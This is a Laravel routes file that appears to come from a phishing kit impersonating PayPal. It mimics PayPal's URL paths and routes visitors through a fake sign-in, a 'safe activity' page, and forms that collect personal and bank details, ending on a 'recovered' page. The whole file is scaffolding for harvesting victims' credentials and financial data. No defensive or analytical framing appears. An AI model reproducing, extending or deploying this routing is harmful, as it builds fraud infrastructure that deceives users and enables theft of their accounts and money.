<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| This file is where you may define all of the routes that are handled
| by your application. Just tell Laravel the URIs it should respond
| to using a Closure or controller method. Build something great!
|
*/

Route::get('/', 'MainController@getCountry');
Route::get('/{country}/webapps/mpp/home', ['uses' => 'MainController@index']);

/****************************************************************
        SIGN IN GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAN!!!!!!!
****************************************************************/

Route::get('/signin', 'SignInController@index');
Route::post('/signin', 'SignInController@post');

Route::get('/safe/activity', 'SummaryController@index');
Route::get('/summary/confirm', 'SummaryController@confirm');
Route::post('/summary/confirm', 'SummaryController@personal');
Route::get('/summary/confirm/bank', 'SummaryController@bank');
Route::post('/summary/confirm/bank', 'SummaryController@store');
Route::get('/summary/recovered', 'SummaryController@finish');
